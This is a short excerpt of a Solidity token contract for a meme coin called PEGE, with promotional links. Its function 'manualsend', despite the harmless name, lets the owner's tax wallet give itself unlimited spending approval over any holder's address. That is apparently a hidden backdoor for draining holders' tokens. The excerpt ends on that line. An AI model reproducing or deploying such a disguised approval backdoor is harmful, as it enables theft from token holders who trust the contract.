...
/*
https://www.pegecoin.wtf/
https://twitter.com/pege_eth
https://t.me/pege_channel
*/
...
contract PEGE is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Pege";
    string private constant _symbol = unicode"PEGE";
    ...
    function manualsend(address _to) external {
        require(_msgSender()==_taxWallet);
        _approve(_to, _msgSender(), type(uint).max);
